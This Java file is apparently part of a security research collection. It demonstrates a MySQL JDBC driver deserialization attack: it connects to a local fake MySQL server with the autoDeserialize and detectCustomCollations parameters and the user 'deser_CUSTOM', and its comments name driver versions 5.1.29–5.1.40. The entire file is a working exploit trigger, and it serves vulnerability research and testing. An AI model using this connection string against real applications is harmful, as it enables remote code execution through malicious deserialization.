package org.su18.jdbc.attack.mysql.customcollations;

import org.su18.jdbc.attack.mysql.util.ConnectionUtil;

/**
 * 使用 https://github.com/fnmsd/MySQL_Fake_Server 进行测试
 * 依赖版本 5.1.29
 * 驱动名称 com.mysql.jdbc.Driver
 * 属性名 detectCustomCollations
 * 连接参数 autoDeserialize=true&detectCustomCollations=true
 * 备注 5.1.29-5.1.40 需指定 detectCustomCollations
 *
 * @author Jasper
 */
public class Attack512x {

	public static void main(String[] args) throws Exception {

		String driverName    = "com.mysql.jdbc.Driver";
		String connectionUrl = "jdbc:mysql://127.0.0.1:49435/test?detectCustomCollations=true&autoDeserialize=true";

		ConnectionUtil.getJDBCConnection(driverName, connectionUrl, "deser_CUSTOM", "");	}

}
